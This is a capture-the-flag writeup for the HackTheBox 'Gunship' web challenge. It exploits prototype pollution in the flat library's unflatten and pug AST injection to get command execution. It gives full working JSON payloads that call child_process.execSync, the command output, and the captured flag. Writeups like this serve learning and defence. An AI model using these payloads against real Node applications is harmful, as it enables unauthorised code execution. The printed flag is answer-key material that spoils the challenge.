---
title: HTB Gunship - Writeup
date: "2021-12-27"
draft: false
tags: ["hackthebox", "challenges", "web", "js", "writeup"]
---

Access details -> 159.65.31.1:32618

We are provided with a website which has only one input field and we have the source code available. 

So let's go through the source code which is made available to us.

### Quick Recon
- Packages installed (`package.json`)
```json
		"dependencies": {
			"express": "^4.17.1",
			"flat": "5.0.0",
			"pug": "^3.0.0"
		}
```
- We have `pug:3.0.0` which is vulnerable to RCE.
- Source: https://github.com/pugjs/pug/issues/3312
---
- Location of vulnerability (`routes/index.js`)
```js
	const pug = require('pug');

	...
	router.post('/api/submit', (req, res) => {
	    const { artist } = unflatten(req.body);
	
		if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
			return res.json({
				'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
			});
		} else {
			return res.json({
				'response': 'Please provide us with the full name of an existing member.'
			});
		}
	});
```
- Request submitted through `/api/submit` where body of the request(`req.body`) is passed to `unflatten`.
- So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.

### Exploiting the bug
- We navigate to `/` (http://159.65.31.1:32618/) and then enter some random values, intercept the request in Burp. 
- Modify the request of the body so it looks like:
```HTTP
POST /api/submit HTTP/1.1
Host: 159.65.31.1:32618
Content-Length: 170
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Origin: http://159.65.31.1:32309
Referer: http://159.65.31.1:32309/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
	"artist.name":"Haigh","__proto__.block": {
	"type": "Text", 
	"line": "process.mainModule.require('child_process').execSync('$(ls | grep flag)')"
	}
}
```
- Output:
```html
<pre>Error: Command failed: $(ls | grep flag)<br>/bin/sh: flagQLGyS: not found<br> on line 1<br>
```
*Note: We are running `$(ls |  grep flag)` instead of `ls | grep flag` because when the command executes without any error, we cannot see the output*

- Now let's `cat` the file
	- Reques bodyt:
```json
		{
			"artist.name":"Haigh","__proto__.block": {
	        "type": "Text", 
	        "line": "process.mainModule.require('child_process').execSync('$(cat flagQLGyS)')"
		    }
		}
```
	- Output:
```html
	<pre>Error: Command failed: $(cat flagQLGyS)<br>/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
	<br> on line 1<br>
```
References:
- (Peak resource) https://blog.p6.is/AST-Injection/
